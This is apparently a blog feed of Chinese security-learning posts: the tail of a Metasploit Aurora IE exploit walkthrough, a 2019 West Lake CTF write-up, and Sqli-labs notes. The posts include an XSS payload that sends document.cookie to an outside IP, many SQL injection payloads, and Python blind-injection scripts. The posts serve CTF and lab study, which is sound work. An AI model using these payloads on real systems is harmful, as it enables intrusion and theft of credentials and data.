src="https://s2.ax1x.com/2019/04/17/AxTlf1.png" alt="AxTlf1.png"></p><p>10.查看msf的监听结果：</p><p><img src="https://s2.ax1x.com/2019/04/17/AxT8l6.png" alt="AxT8l6.png"></p><p>11.查看当前会话，<code>sessions -l</code>；</p><p><img src="https://s2.ax1x.com/2019/04/17/Ax7Ku8.png" alt="Ax7Ku8.png"></p><p>12.aurora攻击中，利用的是IE的缓冲区溢出漏洞，exploit的时候IE会处于阻塞状态，若关闭IE则会话会马上终止，所以需要及时转移会话，继续保持对目标主机的控制。使用migrate可以将meterpreter会话从一个进程移植到另一个进程的内存空间中</p><p><img src="https://s2.ax1x.com/2019/04/17/Ax7fbD.png" alt="Ax7fbD.png"></p><p><img src="https://s2.ax1x.com/2019/04/17/Ax7TPA.png" alt="Ax7TPA.png"></p><p>13.此处将会话迁移到文件资源管理器进程的内存空间中(explorer.exe)；</p><p><img src="https://s2.ax1x.com/2019/04/17/AxH1sK.png" alt="AxH1sK.png"></p><p>此时会话已经迁移，IE浏览器会自动关闭；</p><p>14.提权</p><blockquote><p>getuid 可以查看权限；</p><p>getpid 查看进程号 ；</p></blockquote><p><img src="https://s2.ax1x.com/2019/04/17/Axq1ED.png" alt="Axq1ED.png"></p><p>此时已经获得了XP系统的NT AUTHORITY\SYSTEM权限</p><p>15.创建后门，清除日志</p><p>待学习…</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;Do you konw Aurora?
    
    </summary>
    
      <category term="Metasploit学习" scheme="https://gardenia30.top/categories/Metasploit%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="Metasploit" scheme="https://gardenia30.top/tags/Metasploit/"/>
    
      <category term="内网渗透" scheme="https://gardenia30.top/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>2019西湖论剑初赛复现</title>
    <link href="https://gardenia30.top/2019/04/11/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%A4%8D%E7%8E%B0/"/>
    <id>https://gardenia30.top/2019/04/11/西湖论剑复现/</id>
    <published>2019-04-11T11:17:11.000Z</published>
    <updated>2019-04-23T15:05:49.994Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>很遗憾没有和队友参加这一次西湖论剑初赛，作为萌新肯定是被砍得最惨的那个……但还是来复现一下web吧！<a id="more"></a></p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="babyt3"><a href="#babyt3" class="headerlink" title="babyt3"></a>babyt3</h3><p>打开网页就发现了思路，<code>include $_GET(&#39;file&#39;)</code>，文件包含？？？<del>按理说安恒的题不应该这么明显看出来思路，肯定是出现了点问题…</del></p><p><img src="https://s2.ax1x.com/2019/04/11/AH8G1P.png" alt="AH8G1P.png"></p><p>尝试使用php封装的协议读取一下<code>index.php</code>；成功……<del>WTF????</del></p><p><img src="https://s2.ax1x.com/2019/04/11/AHGHGn.png" alt="AHGHGn.png">base64一下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = @$_GET[<span class="string">'file'</span>];</span><br><span class="line"><span class="keyword">if</span> (!$a) &#123;</span><br><span class="line">$a = <span class="string">'./templates/index.html'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'include $_GET[\'file\']'</span>;</span><br><span class="line"><span class="keyword">if</span> (strpos(<span class="string">'flag'</span>,$a)!==<span class="keyword">false</span>) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'nonono'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span> $a;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!--hint: ZGlyLnBocA== --&gt;</span><br></pre></td></tr></table></figure><p>发现确实是文件包含没错了，要求GET的变量不能包含flag字符，hint解密为dir.php；那就直接读取dir.php；</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = @$_GET[<span class="string">'dir'</span>];</span><br><span class="line"><span class="keyword">if</span>(!$a)&#123;</span><br><span class="line">$a = <span class="string">'/tmp'</span>;</span><br><span class="line">&#125;</span><br><span class="line">var_dump(scandir($a));</span><br></pre></td></tr></table></figure><p>GET一个dir参数，打印出目录列表，那就直接读根目录即可；发现flag信息：</p><p><img src="https://s2.ax1x.com/2019/04/11/AHtjqf.png" alt="AHtjqf.png"></p><p>再返回首页继续用封装协议读文件即可：</p><p><img src="https://s2.ax1x.com/2019/04/11/AHUQAS.png" alt="AHUQAS.png"></p><p><img src="https://s2.ax1x.com/2019/04/11/AHUBh4.png" alt="AHUBh4.png"></p><p>不过试了一下直接<code>?file=/ffffflag_1s_Her4</code>也是可行的，应该是判断写的有问题…非预期解…</p><h3 id="猜猜flag是什么"><a href="#猜猜flag是什么" class="headerlink" title="猜猜flag是什么"></a>猜猜flag是什么</h3><p>没什么思路，直接扫后台，扫出.DS_store，应该对应的是MacOS的.DS_Store 文件泄漏</p><p><img src="https://s2.ax1x.com/2019/04/11/AHBkQJ.png" alt="AHBkQJ.png"></p><p>用exp脚本工具将目录下的东西下载下来</p><p><img src="https://s2.ax1x.com/2019/04/11/AHDZcQ.png" alt="AHDZcQ.png"></p><p>打开并没有发现什么有用的东西，都是一些套路…扫描<code>http://61.164.47.198:10002/e10adc3949ba59abbe56e057f20f883e</code></p><p>时发现.git泄露：</p><p><img src="https://s2.ax1x.com/2019/04/12/AbnCL9.png" alt="AbnCL9.png"></p><p>使用githack恢复源码：</p><p><img src="https://s2.ax1x.com/2019/04/11/AHrdMQ.png" alt="AHrdMQ.png"></p><p>发现压缩包是经过加密的，发现不仅给了压缩包，还给了一张图片，联想到zip明文攻击，攻击后得到hint：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">code is 9faedd5999937171912159d28b219d86</span><br><span class="line">well ok ur good...By the way, flag saved in flag/seed.txt</span><br></pre></td></tr></table></figure><p>访问<code>http://61.164.47.198:10002/?code=9faedd5999937171912159d28b219d86</code>得到伪随机数<strong>500853255</strong></p><p>使用c语言脚本工具php_mt_seed在kali下爆破得到3个seed：</p><p><img src="https://s2.ax1x.com/2019/04/12/Abn1ot.png" alt="Abn1ot.png"></p><p>第一个就是正确的seed：</p><p><img src="https://s2.ax1x.com/2019/04/12/AbnNQg.png" alt="AbnNQg.png"></p><p>参考链接:<a href="https://www.cnblogs.com/zaqzzz/p/9997855.html" target="_blank" rel="noopener">https://www.cnblogs.com/zaqzzz/p/9997855.html</a></p><h3 id="breakout"><a href="#breakout" class="headerlink" title="breakout"></a>breakout</h3><p>随手输入登录进去，发现第一个页面是一个留言功能，容易联想到XSS：</p><p><img src="https://s2.ax1x.com/2019/04/12/AqeXQg.png" alt="AqeXQg.png"></p><p>第二个页面，发现bug后，将页面的URL提交给管理员，管理员会携带cookie查看：</p><p><img src="https://s2.ax1x.com/2019/04/12/AqmAlF.png" alt="AqmAlF.png"></p><p>第三个页面：</p><p><img src="https://s2.ax1x.com/2019/04/12/Aqmem9.png" alt="Aqmem9.png"></p><p>看到第三个界面联想到命令执行，测试一下发现需要管理员身份，</p><p><img src="https://s2.ax1x.com/2019/04/12/AqmNTI.png" alt="AqmNTI.png"></p><p>这样的话，思路就出来了，大概就是用存储型xss，将存在xss的url发送给管理员形成xss盗取cookie，随后伪造管理员身份进行登录，命令执行；</p><h4 id="构造XSS"><a href="#构造XSS" class="headerlink" title="构造XSS"></a>构造XSS</h4><p>测试一下找到输出点：</p><p><img src="https://s2.ax1x.com/2019/04/12/Aqn2Ke.png" alt="Aqn2Ke.png"></p><p>fuzz一下，发现</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(233);&lt;/script&gt;</span><br><span class="line">&lt;:)&gt;alert(233);</span><br></pre></td></tr></table></figure><p>基本的字符script都被替换掉了，测试一下<code>&lt;li&gt;2333&lt;/li&gt;</code>发现还是可用的</p><p><img src="https://s2.ax1x.com/2019/04/12/Aqulse.png" alt="Aqulse.png"></p><p>所以我们可以采取闭合<code>&lt;li&gt;</code>标签的方法来构造XSS，尝试unicode编码绕过：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;/li&gt;&lt;iframe src=&quot;java&amp;#115;cript:window.location.href=&apos;http://165.227.63.123:2335/?a=&apos;+document.cookie&quot;&gt;&lt;/iframe&gt;&lt;li&gt;</span><br></pre></td></tr></table></figure><p>不过一直没有打到cookie，在此记录一下思路……</p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="哈夫曼之谜"><a href="#哈夫曼之谜" class="headerlink" title="哈夫曼之谜"></a>哈夫曼之谜</h3><p>手动解题：</p><p>d和5的编码不确定，有两种可能性，<del>手动复习哈夫曼树</del></p><p><img src="https://s2.ax1x.com/2019/04/12/AbvRxK.jpg" alt="AbvRxK.jpg"></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;很遗憾没有和队友参加这一次西湖论剑初赛，作为萌新肯定是被砍得最惨的那个……但还是来复现一下web吧！
    
    </summary>
    
      <category term="Writeup" scheme="https://gardenia30.top/categories/Writeup/"/>
    
    
      <category term="Web" scheme="https://gardenia30.top/tags/Web/"/>
    
      <category term="Crypto" scheme="https://gardenia30.top/tags/Crypto/"/>
    
      <category term="Misc" scheme="https://gardenia30.top/tags/Misc/"/>
    
  </entry>
  
  <entry>
    <title>Sqli-Labs通关笔记-basic</title>
    <link href="https://gardenia30.top/2019/04/03/Sqli-Labs%E7%AC%94%E8%AE%B0-basic/"/>
    <id>https://gardenia30.top/2019/04/03/Sqli-Labs笔记-basic/</id>
    <published>2019-04-03T03:36:53.000Z</published>
    <updated>2019-04-23T13:31:07.136Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Sqli-labs初体验~<a id="more"></a></p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="less-1"><a href="#less-1" class="headerlink" title="less-1"></a>less-1</h2><p> 是一个简答的字符型注入，GET传参<code>id=1‘</code>，发现报错：</p><blockquote><p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL<br>server version for the right syntax to use near ‘’1’’ LIMIT 0,1’ at line 1</p></blockquote><p>既然报错了就很简单了，直接注释掉后面的引号：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1%27--+</span><br></pre></td></tr></table></figure><p>回显正常，说明确实是字符型注入，接下来就是用<code>order by</code>查询当前表有几个字段；</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1%27 order by 3--+</span><br></pre></td></tr></table></figure><p>到3列为止没有任何问题，到4为止就报错：</p><blockquote><p>Unknown column ‘4’ in ‘order clause’</p></blockquote><p>说明只有3列，那就可以直接用<code>union select</code>进行查询了，这里需要将union select前面的查询语句置空，这样的话，查询的结果就都是union select之后的查询内容了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos; union select 1,2,3--+</span><br></pre></td></tr></table></figure><p>这里的回显结果为2和3，这样的话我们可以直接利用这两个位置进行回显自己想要的数据，得到数据库名和数据库用户名：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos; union select 1,database(),user()--+</span><br></pre></td></tr></table></figure><blockquote><p>Your Login name:security<br>Your Password:root@localhost</p></blockquote><p>接下来就是使用系统数据库的一些表单进行更深入的查询了，一般的顺序就是：<code>爆库-&gt;爆表-&gt;爆列-&gt;爆数据</code>；其实到上述为止已经爆库了；</p><p>接下来是用系统数据库进行查询的一系列步骤：</p><ol><li><p>爆库名（此处爆的是mysql中所有的数据库，而database()只能做到查询到当前库的名字）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos; union select 1,group_concat(schema_name),3 from information_schema.schemata--+</span><br></pre></td></tr></table></figure><blockquote><p>Your Login name:information_schema,challenges,mysql,performance_schema,security<br>Your Password:3</p></blockquote></li><li><p>爆表名（information_schema数据库里的tables表里的table_name和table_schema列）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&apos;security&apos;--+</span><br></pre></td></tr></table></figure><blockquote><p>Your Login name:emails,referers,uagents,users<br>Your Password:3</p></blockquote></li><li><p>爆列名（information_schema数据库里的columns表里的column列）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&apos;users&apos;--+</span><br></pre></td></tr></table></figure><blockquote><p>Your Login name:id,username,password<br>Your Password:3</p></blockquote></li><li><p>爆数值（知道了所有的信息：库名，表名，列名，列出合格的查询语句即可）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos; union select 1,group_concat(username),group_concat(password) from users--+</span><br></pre></td></tr></table></figure><blockquote><p>name:Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4<br>Your Password:Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4</p></blockquote></li></ol><h2 id="less-2"><a href="#less-2" class="headerlink" title="less-2"></a>less-2</h2><p>尝试<code>?id=1‘</code>，<code>?id=1&#39;--+</code>发现全都报错，猜测是数字型注入；</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id=$id LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure><p>发现确实是数字型注入，然后重复less-1的操作即可；</p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 union select 1,2,3--+</span><br></pre></td></tr></table></figure><h2 id="less-3"><a href="#less-3" class="headerlink" title="less-3"></a>less-3</h2><p>尝试<code>?id=1&#39;</code>，<code>?id=1&#39;--+</code>都报错</p><blockquote><p>You have an error in your SQL syntax; check the<br>manual that corresponds to your MySQL server version for the right<br>syntax to use near ‘’1’’) LIMIT 0,1’ at line 1</p></blockquote><p>尝试<code>?id=1&#39;)--+</code>成功回显，查看源代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id=('$id') LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure><p>果然是需要闭合一个引号和括号，接下来就是和less-1一样的操作；</p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=&apos;) union select 1,2,3--+</span><br></pre></td></tr></table></figure><h2 id="less-4"><a href="#less-4" class="headerlink" title="less-4"></a>less-4</h2><p>查看源代码，在$id左右加上双引号和括号：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$id = &apos;&quot;&apos; . $id . &apos;&quot;&apos;;</span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=($id) LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&quot;) union select 1,2,3--+</span><br></pre></td></tr></table></figure><h2 id="小结1"><a href="#小结1" class="headerlink" title="小结1"></a>小结1</h2><p>这部分的注入非常基础和简单，只要熟悉<code>mysql</code>中的<code>information_schema</code>数据库，善于利用<code>order by</code>去查询列数，然后直接用<code>information_schema</code>数据库里的数据表去结合<code>union select</code>查询就好；</p><h2 id="less-5-盲注-单引号"><a href="#less-5-盲注-单引号" class="headerlink" title="less-5(盲注-单引号)"></a>less-5(盲注-单引号)</h2><p>从这里开始就需要使用到sql盲注的知识了，先介绍几个需要用到的常用的函数：</p><blockquote><p>left(a,b) //从左开始截取a的前b位</p><p>ascii() //将单个字符转换为ASCII码</p><p>substr(str,pos,len) //将str字符串截断，从pos位开始取len个字符（开始为1）</p><p>length() //返回字符串的长度</p><p>sleep(n) //将程序挂起一段时间，n为n秒</p><p>if(a,b,c) //如果a=true，则执行b，否则执行c</p></blockquote><p>这里输入<code>?id=1&#39;</code>发现报错，直接注释掉后面的语句<code>?id=1&#39;--+</code>，回显<code>You are in...........</code>；由此得到此题为盲注的类型，直接查询肯定是看不到的，但是可以判断输入的查询语句的结果是否为真，这样的话就可以使用盲注的思路来解决此题：</p><h3 id="solution1-构造逻辑判断"><a href="#solution1-构造逻辑判断" class="headerlink" title="solution1(构造逻辑判断)"></a>solution1(构造逻辑判断)</h3><p>先测试数据库的名字（此处省去二分查找的过程）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and ascii(substr(database(),1,1))=115--+</span><br></pre></td></tr></table></figure><p>回显：<code>You are in...........</code>所以数据库的名字的第一个字母为s，接下来再次测试：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and ascii(substr(database(),2,1))=101--+</span><br></pre></td></tr></table></figure><p>得到数据库名字的第二个字母为e，所以接下来就按照这种方法去测试下面的几个字母就可以很容易的得到数据库的名字，这里就不一一去尝试了，贴上爆破脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">"http://127.0.0.1/sqli-labs/sqli-labs-master/Less-5/?id=1' and ascii(substr(database(),&#123;len&#125;,1))=&#123;ascii&#125;--+"</span></span><br><span class="line">database_name=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">97</span>,<span class="number">123</span>):</span><br><span class="line">url_now=url.format(len=i,ascii=j)</span><br><span class="line">r=requests.get(url_now)</span><br><span class="line">r.encoding=r.apparent_encoding</span><br><span class="line"><span class="keyword">if</span> <span class="string">'You are in...........'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">database_name+=chr(j)</span><br><span class="line"><span class="keyword">print</span> database_name</span><br></pre></td></tr></table></figure><p>得到库名：security，用此方法即可推出表名和列名，只是暴力破解需要时间，慢慢爆破是肯定可以的,给出<strong>payload：</strong><code>?id=1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101--+</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">"http://127.0.0.1/sqli-labs/sqli-labs-master/Less-5/?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 3,1),&#123;len&#125;,1))=&#123;ascii&#125; --+"</span></span><br><span class="line">table_name=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">8</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">97</span>,<span class="number">123</span>):</span><br><span class="line">url_now=url.format(len=i,ascii=j)</span><br><span class="line">r=requests.get(url_now)</span><br><span class="line">r.encoding=r.apparent_encoding</span><br><span class="line"><span class="keyword">if</span> <span class="string">'You are in...........'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">table_name+=chr(j)</span><br><span class="line"><span class="keyword">print</span> table_name</span><br></pre></td></tr></table></figure><p>爆破出表名：</p><p><img src="https://s2.ax1x.com/2019/03/07/kxfRDU.png" alt="kxfRDU.png"></p><p>总的来说，这个方法的主要思路就是：在构造数据库查询语句结果为true和false的时候回显页面不一样，这样的话就可以通过构造逻辑判断的方法来一个个猜测字段的名称，从而达到获取敏感信息的目的；</p><h3 id="solution2-concat函数报错注入"><a href="#solution2-concat函数报错注入" class="headerlink" title="solution2(concat函数报错注入)"></a>solution2(concat函数报错注入)</h3><p>基于concat报错的注入时，利用的是MySQL的一个bug，rand()值不固定，需要多试几次(固定格式，换掉检索内容即可，报错内容和原因有待研究…)</p><p>爆库payload1：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1%27%20union%20select%201,count(*),concat(0x3a,0x3a,database(),0x3a,0x3a,floor(rand()*2))a%20from%20information_schema.tables%20group%20by%20a--+</span><br></pre></td></tr></table></figure><p>得到本数据库名称：</p><blockquote><p>Duplicate entry ‘::security::1’ for key ‘group_key’</p></blockquote><p>爆表payload2：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; union select 1,count(*),concat(0x3a,0x3a,(select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 3,1),0x3a,0x3a,floor(rand()*2))a from information_schema.tables group by a--+</span><br></pre></td></tr></table></figure><p>得到关键数据表名称：</p><blockquote><p>Duplicate entry ‘::users::0’ for key ‘group_key’</p></blockquote><p>爆列payload3：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; union select 1,count(*),concat(0x3a,0x3a,(select column_name from information_schema.columns where table_name=&apos;users&apos; limit 2,1),0x3a,0x3a,floor(rand()*2))a from information_schema.tables group by a--+</span><br></pre></td></tr></table></figure><p>得到关键列名：</p><blockquote><p>Duplicate entry ‘::username::0’ for key ‘group_key’</p><p>Duplicate entry ‘::password::0’ for key ‘group_key’</p></blockquote><p>爆数据payload4：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; union select 1,count(*),concat(0x3a,0x3a,(select username from users limit 1,1),0x3a,0x3a,floor(rand()*2))a from information_schema.tables group by a--+</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; union select 1,count(*),concat(0x3a,0x3a,(select password from users limit 1,1),0x3a,0x3a,floor(rand()*2))a from information_schema.tables group by a--+</span><br></pre></td></tr></table></figure><p>只能通过控制limit的数值查看不同的行数，不可以用group_concat，得到结果：</p><blockquote><p>Duplicate entry ‘::Angelina::1’ for key ‘group_key’</p><p>Duplicate entry ‘::I-kill-you::0’ for key ‘group_key’</p></blockquote><h3 id="solution3-xpath函数报错注入"><a href="#solution3-xpath函数报错注入" class="headerlink" title="solution3(xpath函数报错注入)"></a>solution3(xpath函数报错注入)</h3><h4 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml"></a>updatexml</h4><p>爆库：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and updatexml(1,concat(0x7e,(select database() limit 0,1),0x7e),1)--+</span><br></pre></td></tr></table></figure><p>爆表：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 3,1),0x7e),1)--+</span><br></pre></td></tr></table></figure><p>爆列：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&apos; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns  where table_name=&apos;users&apos; limit 0,1),0x7e),1)--+</span><br></pre></td></tr></table></figure><p>爆值：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and updatexml(1,concat(0x7e,(select username from users limit 2,1),0x7e),1)--+</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and updatexml(1,concat(0x7e,(select password from users limit 2,1),0x7e),1)--+</span><br></pre></td></tr></table></figure><p>得到关键信息：</p><blockquote><p>XPATH syntax error: ‘~Dummy~’</p><p>XPATH syntax error: ‘~p@ssword~’</p></blockquote><p>调整limit参数即可查询不同的行信息；</p><h4 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue"></a>extractvalue</h4><p>和updatexml一样，继续注入即可，不再赘述……</p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and extractvalue(1,concat(0x7e,(payload),0x7e))--+</span><br></pre></td></tr></table></figure><h3 id="solution4-bigint溢出报错注入"><a href="#solution4-bigint溢出报错注入" class="headerlink" title="solution4(bigint溢出报错注入)"></a>solution4(bigint溢出报错注入)</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; union select (!(select * from (select user())x) - ~0),2,3--+</span><br></pre></td></tr></table></figure><p>暂未成功，待更……</p><h3 id="soultion5-double类型溢出报错"><a href="#soultion5-double类型溢出报错" class="headerlink" title="soultion5(double类型溢出报错)"></a>soultion5(double类型溢出报错)</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; union select (exp(~(select * FROM(SELECT USER())a))),2,3--+</span><br></pre></td></tr></table></figure><p>暂未成功，待更……</p><h3 id="solution6-利用数据的重复性报错"><a href="#solution6-利用数据的重复性报错" class="headerlink" title="solution6(利用数据的重复性报错)"></a>solution6(利用数据的重复性报错)</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos;union select 1,2,3 from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x --+</span><br></pre></td></tr></table></figure><p>暂未成功，只能注出mysql版本，待更……</p><h3 id="solution7-延时注入"><a href="#solution7-延时注入" class="headerlink" title="solution7(延时注入)"></a>solution7(延时注入)</h3><p>如果第一个判断为true，则立即返回，若为flase，则会有5秒的延时，后面基本就和solution1一致，不再赘述；给出payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos;and If(ascii(substr(database(),1,1))=115,1,sleep(5))--+</span><br></pre></td></tr></table></figure><h2 id="less-6-盲注-双引号"><a href="#less-6-盲注-双引号" class="headerlink" title="less-6(盲注-双引号)"></a>less-6(盲注-双引号)</h2><p>除了是双引号闭合，其他和less-5一样，不再赘述……</p><h2 id="less-7-文件导入导出"><a href="#less-7-文件导入导出" class="headerlink" title="less-7(文件导入导出)"></a>less-7(文件导入导出)</h2><p>尝试<code>id=1&#39;</code>报错，<code>id=1&#39;--+</code>依然报错，<code>id=1&quot;</code>不报错，那方向还是在单引号上，查看源代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id=(('$id')) LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure><p>发现可以构造<code>id=1&#39;))</code>进行闭合，这里有一个小技巧，就是如何判断是否需要闭合括号，尝试<code>id=1&#39; and 